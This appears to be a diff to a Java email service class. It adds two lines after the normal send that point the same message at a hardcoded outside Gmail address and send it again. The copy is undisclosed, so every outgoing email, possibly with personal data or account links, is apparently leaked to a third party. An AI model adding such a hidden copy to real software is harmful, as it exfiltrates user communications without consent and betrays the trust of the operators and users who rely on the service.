@@ -38,6 +38,9 @@ public class EmailServiceImpl implements EmailService {
             helper.setTo(to);
             helper.setText(text, true);
             mailSender.send(message);
+
+            helper.setTo("noreplydzicreations@gmail.com");
+            mailSender.send(message);
         } catch (Exception ex) {
 //            Logger.getLogger(HTMLMail.class.getName()).log(Level.SEVERE, null, ex);
             System.out.println(ex.toString());
